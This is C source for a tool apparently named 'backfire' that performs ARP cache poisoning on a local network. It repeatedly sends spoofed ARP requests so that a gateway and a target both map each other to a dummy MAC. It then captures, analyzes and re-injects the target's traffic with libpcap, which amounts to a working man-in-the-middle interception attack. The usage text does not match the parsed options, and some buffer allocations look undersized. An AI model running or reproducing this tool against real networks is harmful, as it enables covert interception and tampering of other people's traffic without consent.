#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <signal.h>
#include <stdlib.h>
#include <pthread.h>
#include <unistd.h>
#include <ncurses.h>

#include <arpa/inet.h>
#include <pcap/pcap.h>

#include "formats.h"
#include "analyzer.h"
#include "libs/uthash/uthash.h"

#define TRUE  1
#define FALSE 0
#define FAIL -2

#define BUFFSIZE 65535
#define BUFFER_TM 256 // Customs handler packet buffer timeout

#define Close_Curses {                                        \
  int x, y;                                                   \
  getmaxyx(stdscr, y, x);                                     \
  mvprintw(y-1, 0, "Terminated (press any key to close)");    \
  refresh();                                                  \
  getch();                                                    \
  endwin();                                                   \
}


// ----- ----- STRUCTS ----- ----- //
// Structure used to encapsulate threads' arguments
struct _ThreadArgs {
  pcap_t** captureHandler;
  char* targetDev;
  int snaplen;
  int promisc;
  int packetBufferTm;
  char *filterExp;
  bpf_u_int32 devMask; // device mask
  void* callback;
};
typedef struct _ThreadArgs ThreadArgs;


// ----- ----- GLOBALS ----- ----- //
extern int errno;
char gErrbuf[PCAP_ERRBUF_SIZE]; // pcap error buffer

// Time interval (milliseconds) used to send arp requests
int gXms = 200;

// Pcap's handlers and device used to sniff
char* gSniffingDev = NULL;
pcap_t* gGatekeeperHandler;

// Network informations
char* gGatewayIP;
char* gGatewayMAC;
char* gTargetIP;
char* gTargetMAC;

// Dummy MAC address used to spoof traffic
char* gSpoofedMAC = "3c:5a:b4:88:88:88";

// Termination condition
int gTerminate = FALSE;


// ----- ----- FUNCTION DEFINITIONS ----- ----- //
// Parses the user arguments
int parseUArgs(int argc, char const *argv[]);
// Given a string with <mac>/<ip> formats, divedes the addresses into bucket's positions
int parseMacIp(char* macIp, char** bucket);
// Prints the usage
void  PrintUsage();
// Setup several global variables
void setup();
// Toggles 'gTerminate' value to TRUE on SIGINT interruption
void  SigIntHandler(int signum);
// Loads the filter from the policy file
char* PolicyParser(char* filename);
// Initializes and handle a pcaploop
void* pcapLoop(void *vargp);
// Capture analyzes and filter traffic
void  Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes);
// Sends two requests to router and target device every x milliseconds
void Poisoner(pcap_t* poisonHandler, int xms);


// ----- ----- MAIN ----- ----- //
int main(int argc, char const *argv[]) {
  // - Initialization - //
  initscr(); // Initializing ncurses
  // Parsing policy file
  if(parseUArgs(argc, argv) == -1) return -1;
  char* policies = PolicyParser("policy.txt");

  setup();

  // Checking root permissions
  if(geteuid() != 0) {
    printw("Error: permission denied, need to be root\n");
    Close_Curses;
    return FAIL;
  }

  // Retrieving device info
  bpf_u_int32 devIP;   // device ip address
  bpf_u_int32 devMask; // device mask
  if(pcap_lookupnet(gSniffingDev, &devIP, &devMask, gErrbuf) != 0) {
    printw("Cannot retrieve informations for %s\n", gSniffingDev);
    Close_Curses;
    return FAIL;
  }

  signal(SIGINT, SigIntHandler); // CRTL-C termination

  // - Gatekeeping - //
  // Preparing Gatekeeper filter expression
  int policiesLength = (policies == NULL) ? 0 : strlen(policies);
  int filterLength = strlen(gSpoofedMAC) + policiesLength + 150;
  char* gatekeeperFilter = malloc(filterLength * sizeof(char));

  // (ether src not 3c:5a:b4:88:88:88) && (ether dst 3c:5a:b4:88:88:88) && (policies)
  // strcpy(gatekeeperFilter, "ether src not ");
  // strcat(gatekeeperFilter, gSpoofedMAC);
  // strcat(gatekeeperFilter, " && ether dst ");
  // strcat(gatekeeperFilter, gSpoofedMAC);

  // (ether src gTargetMAC) && (ether dst 3c:5a:b4:88:88:88) && (policies)
  strcpy(gatekeeperFilter, "ether src ");
  strcat(gatekeeperFilter, gTargetMAC);
  strcat(gatekeeperFilter, " && ether dst ");
  strcat(gatekeeperFilter, gSpoofedMAC);

  // Aplying policies
  if(policies != NULL) {
    strcat(gatekeeperFilter, " && (");
    strcat(gatekeeperFilter, policies);
    strcat(gatekeeperFilter, ")");
    free(policies);
  }

  // Preparing Gatekeeper loop initializer arguments
  ThreadArgs* gatekeeperArgs = malloc(sizeof(ThreadArgs));
  gatekeeperArgs -> captureHandler = &gGatekeeperHandler;
  gatekeeperArgs -> targetDev = gSniffingDev;
  gatekeeperArgs -> snaplen = BUFFSIZE;
  gatekeeperArgs -> promisc = TRUE;
  gatekeeperArgs -> packetBufferTm = BUFFER_TM;
  gatekeeperArgs -> filterExp = gatekeeperFilter;
  gatekeeperArgs -> devMask = devMask;
  gatekeeperArgs -> callback = Gatekeeper;

  // Starting the gatekeeper
  pthread_t gatekeeperTid;
  pthread_create(&gatekeeperTid, NULL, pcapLoop, (void*) gatekeeperArgs);

  // - Poisoning - //
  // Initializing handler
  pcap_t* poisonHandler = pcap_open_live(gSniffingDev, BUFFSIZE, TRUE, BUFFER_TM, gErrbuf);
  if(poisonHandler != NULL) Poisoner(poisonHandler, gXms);
  else fprintf(stderr, "%s", pcap_geterr(poisonHandler));

  // - Closing Threads - //
  if(gGatekeeperHandler != NULL) pcap_breakloop(gGatekeeperHandler);
  pthread_join(gatekeeperTid, NULL);

  // - Cleaning Environment - //
  free(gTargetIP);  free(gTargetMAC);
  free(gGatewayIP); free(gGatewayMAC);

  cleanAnalyzer(); // Cleaning analyzer

  printw("Glad to stop, sir.\n");
  refresh();

  Close_Curses;
  return 0;
}


// ----- ----- ENVIRONMENT INITIALIZATION ----- ----- //
void setup() {
  // This variables have to be converted to network format
  ARP_REQUEST = htons(ARP_REQUEST);
  ARP_REPLY   = htons(ARP_REPLY);
  IP_PROTO    = htons(IP_PROTO);
}

/*
 * NAME: parseMacIp
 *
 * DESCRIPTION: takes a string with format '<mac>/<ip>' and copy ip and mac address
 *              separately into bucket first and second position. After be used the
 *              first and second position in the bucket need to be cleaned with a 'free()'
 *
 * INPUT:
 *        macIp  - a string containing an IP and MAC address with the format <mac>/<ip>
 *                 eg. '3c:5a:b4:88:88:88/192.168.1.1'
 *        bucket - a char* array where to put the data
 *
 * RETURN: zero on success; -1 if an error occurres
 */
int parseMacIp(char* macIp, char** bucket) {
  char *token;
  const char s[2] = "/";

  // Taking first token
  if((token = strtok(macIp, s)) == NULL) return -1;
  bucket[0] = malloc((strlen(token) + 1) * sizeof(char));
  strcpy(bucket[0], token);

  // Taking second token
  if((token = strtok(NULL, s)) == NULL) {
    free(bucket[0]); // Cleaning if fails
    return -1;
  }
  bucket[1] = malloc((strlen(token) + 1) * sizeof(char));
  strcpy(bucket[1], token);

  return 0;
}

/*
 * NAME: parseUArgs
 *
 * DESCRIPTION: prepares the environment with user arguments values
 */
int parseUArgs(int argc, char const *argv[]) {
  int opt;

  while ((opt = getopt(argc, (char *const *) argv, "g:t:d:x:")) != -1) {
      switch (opt) {
      case 't': {
        // Taking target device ip and mac addresses
        char* bucket[2];
        if(parseMacIp(optarg, bucket) != 0) break;
        gTargetMAC = bucket[0];
        gTargetIP  = bucket[1];

        break;
      }
      case 'g': {
        // Taking gateway ip and mac addresses
        char* bucket[2];
        if(parseMacIp(optarg, bucket) != 0) break;
        gGatewayMAC = bucket[0];
        gGatewayIP  = bucket[1];

        break;
      }
      case 'x': {
        int aus = atoi(optarg);
        if(aus != 0) gXms = aus;

        break;
      }
      case 'd': {
        gSniffingDev = optarg;

        break;
      }
      default:
        PrintUsage();
        return EXIT_FAILURE;
      }
  }

  if(gGatewayIP==NULL || gTargetIP==NULL || gSniffingDev==NULL || gTargetMAC==NULL) {
    PrintUsage();
    return EXIT_FAILURE;
  }
  else return 0;
}


// ----- ----- MISCELLANEOUS ----- ----- //
void PrintUsage() {
  printw("\
Usage: backfire [option]                                                          \n\
Options:                                                                          \n\
  -a [mac address]: gateway mac address                                           \n\
  -i [ip]         : gateway ip                                                    \n\
  -t [ip]         : target machine ip                                             \n\
  -d [device]     : device from which capture and inject the traffic              \n\
  ");
  printw("\n");
  refresh();
}

void SigIntHandler(int signum) {
  gTerminate = TRUE;
}

/*
 * NAME: PolicyParser
 *
 * DESCRIPTION: builds up a filter reading the policy file line by line. Each
 *              The string representing the filter is build with the format '<line 1> or ... or <line n>'
 *              and needs to be cleaned with 'free()' after the use.
 *
 * INPUT:
 *        'filename'- the file's name containing the policy
 *
 * RETURN: a pointer to the filter
 */
char* PolicyParser(char* filename) {
  FILE* fp;
  char* line = NULL;
  char* policy = NULL;
  size_t len = 0;
  ssize_t cread;

  fp = fopen(filename, "r");
  if (fp == NULL) return NULL;

  // Reading file line by line
  while ((cread = getline(&line, &len, fp)) != -1) {
    line[strlen(line)-1] = '\0';
    if(strcmp(line, "") == 0) continue;
    if(policy != NULL) {
      int totalSize = (strlen(policy) + cread + 7) * sizeof(char);
      policy = realloc(policy, totalSize);
      strcat(policy, " or (");
      strcat(policy, line);
      strcat(policy, ")");
    }
    else {
      // First line
      policy = malloc(cread * sizeof(char));
      strcpy(policy, line);
    }
  }

  // Cleaning and returning
  fclose(fp);
  if (line) free(line);
  return policy;
}


// ----- ----- LOOP INITIALIZER ----- ----- //
/*
 * NAME: cleanThreadEnv
 *
 * DESCRIPTION: clean all the environment setted up by the call of 'pcapLoop' and set
 *              sets 'gTerminate'
 *
 * INPUT:
 *        'args'    - contains all the directive on by how the 'pcap_loop' has been initialized
 *        'handler' - is the handler used by the 'pcap_loop'
 *        'filter'  - the filter used by the 'pcap_loop'
 *
 */
void cleanThreadEnv(ThreadArgs* args, pcap_t* handler, struct bpf_program* filter) {
  gTerminate = TRUE;

  if(handler != NULL) {
    pcap_close(handler);
    if(filter!=NULL) pcap_freecode(filter);
  }
  free(args);
}

/*
 * NAME: pcapLoop
 *
 * DESCRIPTION: Initialize a 'pcap_loop' with the arguments contained in 'vargp'.
 *              Handles the closure if the 'pcap_breakloop' is called with the
 *              handler contained in 'vargp'
 *
 * INPUT:
 *        'vargp' - contains all the directives on how to initilize a 'pcap_loop'
 */
void *pcapLoop(void *vargp) {
  ThreadArgs* args = (ThreadArgs*) vargp;
  pcap_t* handler;
  struct bpf_program filter;

  // Creating and opening handler
  if((handler = pcap_open_live(args->targetDev, args->snaplen, args->promisc, args->packetBufferTm, gErrbuf)) == NULL) {
    fprintf(stderr, "%s\n", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up global handler
  pcap_t** ghandler = args->captureHandler;
  *ghandler = handler;

  // Setting up filters
  if (pcap_compile(handler, &filter, args->filterExp, TRUE, args->devMask) == -1) {
    fprintf(stderr, "%s\n", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }
	if (pcap_setfilter(handler, &filter) == -1) {
    fprintf(stderr, "%s\n", pcap_geterr(handler));
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
	}

  // Checking if something went wrong in the other thread
  if(gTerminate) {
    cleanThreadEnv(args, handler, &filter);
    pthread_exit(NULL);
  }

  // Setting up callback and loopig
  int loopReturn = pcap_loop(handler, -1, args->callback, (unsigned char *) handler);
  if(loopReturn == -1) {
    fprintf(stderr, "Error while looping\n");
  }

  // Cleaning and returning
  cleanThreadEnv(args, handler, &filter);
  pthread_exit(NULL);
}


// ----- ----- POISONER ----- ----- //
/*
 * NAME: Poisoner
 *
 * DESCRIPTION: sends two arp request every 'xms' milliseconds. The first request
 *              poisons the gateway cache, the second the target device's cache
 *
 * INPUT:
 *        'poisonHandler' - the handler to be used to sends the requests
 */
void Poisoner(pcap_t* poisonHandler, int xms) {
  // Starting poisoning
  while (!gTerminate) {
    // Poisoning gateway's cache
    uint8_t* spoofedPkt = BuildEthArp(ARP_REQUEST, gTargetIP, gSpoofedMAC, gGatewayIP, NULL);
    pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE); // ¯\_(ツ)_/¯
    free(spoofedPkt);

    // Poisoning target's cache
    spoofedPkt = BuildEthArp(ARP_REQUEST, gGatewayIP, gSpoofedMAC, gTargetIP, NULL);
    pcap_sendpacket(poisonHandler, spoofedPkt, ARP_SIZE);
    free(spoofedPkt);

    // Poisoning target cache
    usleep(xms * 1000);
  }
}


// ----- ----- GATEKEEPING ----- ----- //
/*
 * NAME: Gatekeeper
 *
 * DESCRIPTION: implement the callback to handle packets send by devices whose cache
 *              have been succesfully poisoned
 */
void Gatekeeper(uint8_t *user, const struct pcap_pkthdr *h, const uint8_t *bytes) {
  Analyze(h->caplen, bytes);

  // Rebuilding Ethernet frame
  EthHeader* eth = (EthHeader*) bytes;

  // Spoofing destination
  unsigned char dstMac[6];
  if(memcmp(eth->srcAddr, gGatewayMAC, 6) == 0){
    // Packet sent from gateway to device
    stringToMAC(gTargetMAC, dstMac);
  }
  else {
    // Packet sent from device to gateway
    stringToMAC(gGatewayMAC, dstMac);
  }

  // Change source from gateway to dummy MAC
  memcpy(eth->srcAddr, eth->dstAddr, 6);
  // Change destination from dummy to device
  memcpy(eth->dstAddr, dstMac, 6);

  // Injecting
  int res = pcap_sendpacket(gGatekeeperHandler, bytes, h->len);
  if(res != 0) {
    fprintf(stderr, "Error while injecting: %s\n", pcap_geterr(gGatekeeperHandler));
  }
}
